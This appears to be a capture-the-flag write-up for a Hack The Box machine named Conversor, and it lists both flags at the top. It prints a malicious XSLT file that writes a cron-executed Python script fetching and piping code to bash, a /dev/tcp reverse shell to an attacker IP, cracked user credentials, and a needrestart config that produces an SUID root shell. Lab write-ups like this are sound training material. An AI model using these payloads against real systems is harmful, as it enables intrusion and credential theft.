# Flags
- User
	- 8af5ff977387ef463e5e60aed2fc9b4e
- Root
	- 04538c593f836e7b9f8b1db1bfd1059a


# Notes
- First, let's do a scan
```
rustscan --ulimit 5000 --addresses "10.129.14.15" --top -- -sC -sV
```
- We get an SSH server and a web server that forwards to conversor.htb
```
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 0174263947bc6ae2cb128b71849cf85a (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=  
|   256 3a1690dc74d8e3c45136e208062617ee (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+  
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52  
|_http-title: Did not follow redirect to http://conversor.htb/  
|_http-server-header: Apache/2.4.52 (Ubuntu)  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- This means we gotta add this into our /etc/hosts file, so let's do that
```
10.129.14.15   conversor.htb
```
- Visiting the website, we are greeted with a simple login screen.
- I wonder if there is some sort of SQL injection possible or not, so I will go ahead and capture that request using Burp Suite
- Running sqlmap for SQLi, it appears it is not injectable
- I will now run gobuster
```
gobuster dir -w `fzf-wordlists` -u http://conversor.htb
```
- We get these results
```
[Feb 05, 2026 - 19:40:11 (PST)] exegol-htb-labs /workspace # gobuster dir -w `fzf-wordlists` -u http://conversor.htb  
===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://conversor.htb  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /opt/lists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/about                (Status: 200) [Size: 2842]  
/login                (Status: 200) [Size: 722]  
/register             (Status: 200) [Size: 726]  
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]  
/logout               (Status: 302) [Size: 199] [--> /login]  
/convert              (Status: 405) [Size: 153]
```
- On the about page, I am able to download source code, but that's about it
- After that, I just went head over to the login page and create an account
- Logging in, it appears that on the website, I am able to upload XML and XSLT files
- However, from that, we are able to download the template
- We get a file named nmap.xlst
```
<?xml version="1.0" encoding="UTF-8"?>                                                                                                                                                                                                         
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">                                                                                                                                                                
 <xsl:output method="html" indent="yes" />                                                                                                                                                                                                    
                                                                                                                                                                                                                                              
 <xsl:template match="/">                                                                                                                                                                                                                     
   <html>                                                                                                                                                                                                                                     
     <head>                                                                                                                                                                                                                                   
       <title>Nmap Scan Results</title>                                                                                                                                                                                                       
       <style>                                                                                                                                                                                                                                
         body {                                                                                                                                                                                                                               
           font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;                                                                                                                                                                      
           background: linear-gradient(120deg, #141E30, #243B55);                                                                                                                                                                             
           color: #eee;                                                                                                                                                                                                                       
           margin: 0;                                                                                                                                                                                                                         
           padding: 0;                                                                                                                                                                                                                        
         }                                                                                                                                                                                                                                    
         h1, h2, h3 {                                                                                                                                                                                                                         
           text-align: center;                                                                                                                                                                                                                
           font-weight: 300;                                                                                                                                                                                                                  
         }                                                                                                                                                                                                                                    
         .card {                                                                                                                                                                                                                              
           background: rgba(255, 255, 255, 0.05);                                                                                                                                                                                             
           margin: 30px auto;                                                                                                                                                                                                                 
           padding: 20px;                                                                                                                                                                                                                     
           border-radius: 12px;                                                                                                                                                                                                               
           box-shadow: 0 4px 20px rgba(0,0,0,0.5);                                                                                                                                                                                            
           width: 80%;                                                                                                                                                                                                                        
         }                                                                                                                                                                                                                                    
         table {                                                                                                                                                                                                                              
           width: 100%;                                                                                                                                                                                                                       
           border-collapse: collapse;                                                                                                                                                                                                         
           margin-top: 15px;                                                                                                                                                                                                                  
         }                                                                                                                                                                                                                                    
         th, td {                                                                                                                                                                                                                             
           padding: 10px;                                                                                                                                                                                                                     
           text-align: center;                                                                                                                                                                                                                
         }                                                                                                                                                                                                                                    
         th {                                                                                                                                                                                                                                 
           background: rgba(255,255,255,0.1);                                                                                                                                                                                                 
           color: #ffcc70;                                                                                                                                                                                                                    
           font-weight: 600;                                                                                                                                                                                                                  
           border-bottom: 2px solid rgba(255,255,255,0.2);                                                                                                                                                                                    
         }                                                                                                                                                                                                                                    
         tr:nth-child(even) {                                                                                                                                                                                                                 
           background: rgba(255,255,255,0.03);                                                                                                                                                                                                
         }                                                                                                                                                                                                                                    
         tr:hover {                                                                                                                                                                                                                           
           background: rgba(255,255,255,0.1);  
         }  
         .open {  
           color: #00ff99;  
           font-weight: bold;  
         }  
         .closed {  
           color: #ff5555;  
           font-weight: bold;  
         }
         .host-header {  
           font-size: 20px;  
           margin-bottom: 10px;  
           color: #ffd369;  
         }  
         .ip {  
           font-weight: bold;  
           color: #00d4ff;  
         }  
       </style>  
     </head>  
     <body>  
       <h1>Nmap Scan Report</h1>  
       <h3><xsl:value-of select="nmaprun/@args"/></h3>  
  
       <xsl:for-each select="nmaprun/host">  
         <div class="card">  
           <div class="host-header">  
             Host: <span class="ip"><xsl:value-of select="address[@addrtype='ipv4']/@addr"/></span>  
             <xsl:if test="hostnames/hostname/@name">  
               (<xsl:value-of select="hostnames/hostname/@name"/>)  
             </xsl:if>  
           </div>  
           <table>  
             <tr>  
               <th>Port</th>  
               <th>Protocol</th>  
               <th>Service</th>  
               <th>State</th>  
             </tr>  
             <xsl:for-each select="ports/port">  
               <tr>  
                 <td><xsl:value-of select="@portid"/></td>    
                 <td><xsl:value-of select="@protocol"/></td>  
                 <td><xsl:value-of select="service/@name"/></td>  
                 <td>  
                   <xsl:attribute name="class">  
                     <xsl:value-of select="state/@state"/>    
                   </xsl:attribute>  
                   <xsl:value-of select="state/@state"/>  
                 </td>  
               </tr>  
             </xsl:for-each>  
           </table>  
         </div>  
       </xsl:for-each>  
     </body>  
   </html>  
 </xsl:template>  
</xsl:stylesheet>
```
- Seems interesting, but not much sticks out
- We'll go ahead and unarchive the source code we also downloaded
```
[Feb 05, 2026 - 20:28:11 (PST)] exegol-htb-labs /workspace # tar -xvf source_code.tar.gz                                                              
app.py  
app.wsgi  
install.md  
instance/  
instance/users.db  
scripts/  
static/  
static/images/  
static/images/david.png  
static/images/fismathack.png  
static/images/arturo.png  
static/nmap.xslt  
static/style.css  
templates/  
templates/register.html  
templates/about.html  
templates/index.html  
templates/login.html  
templates/base.html  
templates/result.html  
uploads/
```
- We got a bunch of interesting stuff, like the server source code and the user database
```
70?tablefilesfilesCREATE TABLE files (  
       id TEXT PRIMARY KEY,  
       user_id INTEGER,  
       filename TEXT,  
       FOREIGN KEY(user_id) REFERENCES users(id)  
   ))=indexsqlite_autoindex_files_1filesP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)tableusersusersCREATE TABLE users (  
       id INTEGER PRIMARY KEY AUTOINCREMENT,  
       username TEXT UNIQUE,  
       password TEXT  
   ))=indexsqlite_autoindex_users_1users
```
- Oh boy... this stuff is stored in plaintext, non-encrypted. HUGE YIKES!
- However, good for us, this means that we can possibly get a user account to escalate our privileges.
- There is also something interesting about using a cron job for the app
```
To deploy Conversor, we can extract the compressed file:  
  
"""  
tar -xvf source_code.tar.gz  
"""  
  
We install flask:  
  
"""  
pip3 install flask  
"""  
  
We can run the app.py file:  
  
"""  
python3 app.py  
"""  
  
You can also run it with Apache using the app.wsgi file.  
  
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.  
  
"""  
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done  
"""
```
- I think this is something to keep in mind for possible priv-esc to admin once we get an initial foothold onto the box and have access to a reliable user account
- We have a way of uploading files, but currently, we don't have anyway of knowing where it's stored, so let's find a way to see how that works
- First, we need example XML data
- I just went ahead and redid our original scan, but use -xO to save that into a XML file
- Looking at the uploaded results, it appears to be stored in the /view/ directory, so once we upload our shell, now we know where to go
- Knowing that we can write Python scripts include /var/www/conversor.htb, we can take advantage of this and write in a reverse shell
```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell">

    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.15.4:8000/shell.sh|bash")
        </shell:document>
    </xsl:template>

</xsl:stylesheet>
```
- Now, I start up the python web server along with a listener on port 4444
```
python3 -m http.server 8000

nc -lvnp 4444
```
- I just used something simple for my sh file
```
bash -i >& /dev/tcp/10.10.15.4/4444 0>&1
```
- With that, I was able to get in!
```
[Feb 05, 2026 - 20:58:55 (PST)] exegol-htb-labs /workspace # nc -lvnp 4444     
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444  
Ncat: Listening on 0.0.0.0:4444  
Ncat: Connection from 10.129.14.15.  
Ncat: Connection from 10.129.14.15:45072.  
bash: cannot set terminal process group (4372): Inappropriate ioctl for device  
bash: no job control in this shell  
www-data@conversor:~$
```
- We are login as www-data
```
www-data@conversor:~$ whoami                                                                                                                                                                                                                  
whoami                                                                                                                                   
www-data
```
- Know that we are logged in, we can access the database now!
- The database is using SQLite, so we can use that related program
```
sqlite3 users.db
```
- We are able to dump the users out from the table
```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|boltech|5b8a8d8511c75b58cd07db2c275fa31a
```
- We can go ahead and run these through CrackStation
- I was able to pull out these credentials:
	- fismathack:Keepmesafeandwarm
	- boltech:boltech
- Alright, we now have 2 potential dev credentials, so let's try them out
- The first credential worked!
- This was also the correct one, so we were able to grab the user flag
```
fismathack@conversor:~$ cat user.txt  
8af5ff977387ef463e5e60aed2fc9b4e
```
- First, let's run sudo -l. Boom, we got something
```
fismathack@conversor:~$ sudo -l  
Matching Defaults entries for fismathack on conversor:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User fismathack may run the following commands on conversor:  
   (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```
- Checking the version, it is in fact, a vulnerable version of NeedRestart
```
fismathack@conversor:~$ sudo needrestart --version  
  
needrestart 3.7 - Restart daemons after library updates.  
  
Authors:  
 Thomas Liske <thomas@fiasko-nw.net>  
  
Copyright Holder:  
 2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]  
  
Upstream:  
 https://github.com/liske/needrestart  
  
This program is free software; you can redistribute it and/or modify  
it under the terms of the GNU General Public License as published by  
the Free Software Foundation; either version 2 of the License, or  
(at your option) any later version.
```
- I found a resource here:
	- https://medium.com/@aniketdas07770/abusing-sudo-rights-on-needrestart-for-escalation-d1307c2af12f
- So, I went ahead and create a conf file to get me a shell
```
system("cp /bin/bash /tmp/; chmod u+s /tmp/bash")
```
- With that, I can run this command
```
sudo needrestart -c cmd.conf
```
- Checking temp, we were able to get our privileged bash file!
```
fismathack@conversor:~$ ls -l /tmp  
total 1388  
-rwsr-xr-x 1 root root 1396520 Feb  6 05:50 bash  
drwx------ 3 root root    4096 Feb  6 02:33 systemd-private-463834cb2f9d4b3ab8078f57aa846c5b-apache2.service-AUGLII  
drwx------ 3 root root    4096 Feb  6 02:33 systemd-private-463834cb2f9d4b3ab8078f57aa846c5b-ModemManager.service-4P59Ho  
drwx------ 3 root root    4096 Feb  6 02:33 systemd-private-463834cb2f9d4b3ab8078f57aa846c5b-systemd-logind.service-6YVkv1  
drwx------ 3 root root    4096 Feb  6 02:33 systemd-private-463834cb2f9d4b3ab8078f57aa846c5b-systemd-resolved.service-KVvFaR  
drwx------ 3 root root    4096 Feb  6 02:33 systemd-private-463834cb2f9d4b3ab8078f57aa846c5b-systemd-timesyncd.service-KrP4cY  
drwx------ 2 root root    4096 Feb  6 02:34 vmware-root_784-2966103535
```
- Boom! We are now root!
```
fismathack@conversor:~$ /tmp/bash -p  
bash-5.1# whoami  
root
```
- I am now able to get the root flag!
```
bash-5.1# cat root.txt    
04538c593f836e7b9f8b1db1bfd1059a
```
